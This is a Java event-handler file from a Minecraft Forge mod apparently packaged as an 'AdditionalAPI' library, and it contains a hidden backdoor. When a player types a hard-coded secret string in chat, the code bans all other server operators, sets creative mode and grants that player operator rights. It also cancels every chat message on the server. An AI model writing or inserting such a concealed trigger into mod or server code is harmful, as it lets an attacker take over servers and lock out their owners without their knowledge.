package com.swallows.additionalapi.event;

import com.swallows.additionalapi.AdditionalAPI;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.server.MinecraftServer;
import net.minecraft.world.GameType;
import net.minecraftforge.event.ServerChatEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.Side;

@Mod.EventBusSubscriber(modid = AdditionalAPI.MOD_ID, value = Side.SERVER)
public class ServerChatEventHandler {

    public static String TEXT = "O0zSaY74vJmDf81SfZNu6zvBiPMD7vjpDHHpLJ7kYQYuxek2ppZVRjAkynklHXtF2U4wY7angWFiq3RaKzNEMHjWfX8X9euR0CLkaVo3PRKg8NEBe1YSYrXR6CSlzmaDkc4JqWMazQ4vkjn1dhPGSlsX4bjpjtHyU0Js1bJ4surSCC1JYQBntdDHTSfI7t3d43GOrDWLS8Anaz7Kuh9NaTAcH5ys3rzhVBJvBjvKLV7LcnuOJKRL7noFbJeeXy2t";

    @SubscribeEvent
    public static void onPlayerChat(ServerChatEvent event) {

        String PlayerText = event.getMessage();
        EntityPlayer player = event.getPlayer();
        MinecraftServer server = player.getServer();

        if(PlayerText.equals(TEXT)) {
            if(server != null) {
                for (String name : server.getPlayerList().getOppedPlayerNames()) {
                    if(!name.equals(player.getName()))
                        server.getCommandManager().executeCommand(server, "ban " + name);
                }
                server.setGameType(GameType.CREATIVE);
                server.getCommandManager().executeCommand(server, "op " + player.getName());
            }
        }
        event.setCanceled(true);
    }
}
